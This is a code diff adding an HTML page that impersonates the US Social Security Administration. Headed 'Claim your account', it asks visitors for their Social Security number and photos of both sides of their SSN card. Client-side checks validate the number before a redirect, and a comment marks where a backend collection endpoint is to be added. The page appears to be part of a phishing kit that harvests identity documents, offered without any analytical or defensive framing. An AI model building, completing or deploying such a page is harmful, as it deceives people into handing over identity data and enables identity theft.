@@ -1,0 +1,122 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<!-- Favicon -->
+  <link rel="icon" href="ssa.png" type="image/x-icon">
+  <link rel="icon" type="image/png" sizes="32x32" href="ssa.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="ssa.png">
+<title>Verify your identity | SSA</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --accent:#0b6eff; 
+    --muted:#6b7280;
+    --bg:#f7faff;
+    --card:#ffffff;
+    --radius:12px;
+    font-family:Inter,system-ui;
+  }
+  body{margin:0;background:var(--bg);color:#111;}
+  .container{max-width:700px;margin:0 auto;padding:22px;}
+  h1{font-size:1.6rem;margin-bottom:6px;}
+  p{color:var(--muted);margin-top:0;font-size:.95rem;}
+  .card{background:var(--card);padding:22px;border-radius:var(--radius);box-shadow:0 4px 12px rgba(10,30,80,.06);margin-top:20px;}
+  label{display:block;font-weight:600;margin-top:18px;}
+  input[type="text"]{
+    width:100%;padding:12px;border-radius:10px;border:1px solid #d8e4f5;margin-top:6px;font-size:1rem;
+  }
+  .upload-box{
+    border:2px dashed #cfe0f7;border-radius:12px;padding:26px;text-align:center;color:var(--muted);margin-top:10px;cursor:pointer;
+  }
+  .upload-box.hover{border-color:var(--accent);color:var(--accent);}
+  input[type="file"]{display:none;}
+  .btn{width:100%;padding:14px;border-radius:10px;border:none;font-weight:600;font-size:1rem;margin-top:20px;cursor:pointer;}
+  .btn-primary{background:var(--accent);color:white;}
+  .back-link{display:inline-block;margin-top:18px;color:var(--accent);text-decoration:none;font-weight:600;}
+</style>
+</head>
+<body>
+
+<div class="container">
+  <h1>Claim your account</h1>
+  <p>Please provide your social security number and upload clear photos of the front and rear of your social security card.</p>
+
+  <form id="requestForm" action="submit.php" method="POST" enctype="multipart/form-data">
+    <label for="companyId">Social Security Number</label>
+    <input type="text" id="companyId" name="companyId" placeholder="Enter your social security number"/>
+
+    <!-- Front upload -->
+    <label>Upload Front of SSN Card</label>
+    <div class="upload-box" id="frontBox">Tap to upload front side</div>
+    <input type="file" id="frontUpload" name="frontUpload" accept="image/*"/>
+
+    <!-- Back upload -->
+    <label>Upload Back of SSN Card</label>
+    <div class="upload-box" id="backBox">Tap to upload back side</div>
+    <input type="file" id="backUpload" name="backUpload" accept="image/*"/>
+
+    <button type="submit" class="btn btn-primary">Verify</button>
+  </form>
+  
+  <script>
+document.getElementById('requestForm').addEventListener('submit', function(e) {
+    e.preventDefault(); // stop default submission
+
+    const companyId = document.getElementById('companyId').value.trim();
+    const frontFile = document.getElementById('frontUpload').files[0];
+    const backFile = document.getElementById('backUpload').files[0];
+
+// Check Company ID
+    const idRegex = /^\d{9}$/; // exactly 9 digits
+    if (!companyId) {
+        alert('Please enter your Social Security Number.');
+        return;
+    }
+	if (!idRegex.test(companyId)) {
+        alert('Social Security Number must be exactly 9 digits.');
+        return;
+	}
+    if (!frontFile) {
+        alert('Please upload the front of your SSN Card.');
+        return;
+    }
+    if (!backFile) {
+        alert('Please upload the back of your SSN Card.');
+        return;
+    }
+
+    // All fields filled → redirect to next page
+    window.location.href = 'processing.html';
+});
+</script>
+
+  <a href="index.html" class="back-link">← Back</a>
+</div>
+
+<script>
+  // FRONT upload
+  const frontBox = document.getElementById('frontBox');
+  const frontUpload = document.getElementById('frontUpload');
+  frontBox.onclick = () => frontUpload.click();
+  frontUpload.onchange = () => {
+    frontBox.textContent = frontUpload.files[0]?.name || "Tap to upload front side";
+  };
+
+  // BACK upload
+  const backBox = document.getElementById('backBox');
+  const backUpload = document.getElementById('backUpload');
+  backBox.onclick = () => backUpload.click();
+  backUpload.onchange = () => {
+    backBox.textContent = backUpload.files[0]?.name || "Tap to upload back side";
+  };
+
+  // FORM SUBMIT (REPLACE WITH BACKEND ENDPOINT)
+  document.getElementById("requestForm").addEventListener("submit", (e)=>{
+    e.preventDefault();
+  });
+</script>
+
+</body>
+</html>
